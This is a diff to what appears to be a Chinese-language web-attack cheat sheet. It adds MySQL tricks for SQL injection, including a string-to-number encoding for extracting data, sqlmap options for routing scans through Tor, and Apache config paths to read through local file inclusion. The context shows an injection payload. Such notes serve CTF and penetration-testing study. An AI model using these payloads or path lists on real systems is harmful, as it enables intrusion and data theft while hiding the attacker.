@@ -712,12 +712,26 @@ pop graphic-context
     - @@hostname
     - @@version_compile_os
         - Operating System
+    - @@innodb_version
     - MD5()
     - SHA1()
     - COMPRESS() / UNCOMPRESS()
     - group_concat()
         - 合併多條結果
             - e.g. `select group_concat(username) from users;` 一次返回所有使用者名
+    - greatest()
+        - `greatest(a, b)`返回a, b中最大的
+        - `greatest(1, 2)=2`
+            - 1
+        - `greatest(1, 2)=1`
+            - 0
+    - between a and b
+        - 介於a到b之間
+        - `greatest(1, 2) between 1 and 3`
+            - 1
+    - regexp
+        - `SELECT 'abc' regexp '.*'`
+            - 1
     - Collation
         - `*_ci` case insensitive collation 不區分大小寫
         - `*_cs` case sensitive collation 區分大小寫
@@ -823,6 +837,12 @@ pop graphic-context
 
 - group by with rollup
     - `' or 1=1 group by pwd with rollup limit 1 offset 2#`
+
+- 將字串轉成純數字
+    - 字串 -> 16進位 -> 10進位
+    - `conv(hex(YOUR_DATA), 16, 10)`
+    - 還原：`unhex(conv(DEC_DATA,10,16))`
+    - 需注意不要Overflow
 
 - 不使用逗號
     - `LIMIT N, M` => `LIMIT M OFFSET N`
@@ -1131,8 +1151,7 @@ HQL injection example (pwn2win 2017)
         - `--technique`
             - default: `BEUSTQ`
         - Cookie: `--cookie="abc=55667788"`
-                                                                                 
-
+        - Tor: `--tor --check-tor --tor-type=SOCKS5 --tor-port=9050`
 
 # LFI
 
@@ -1152,6 +1171,8 @@ HQL injection example (pwn2win 2017)
 - `/var/log/apache2/error.log`
 - `/var/log/httpd/access_log`
 - `/usr/local/apache2/conf/httpd.conf`
+- `/etc/apache2/apache2.conf`
+- `/etc/apache2/sites-available/000-default.conf`
 - `/usr/local/etc/apache2/httpd.conf`
 - `/etc/nginx/conf.d/default.conf`
 - `/etc/nginx/nginx.conf`
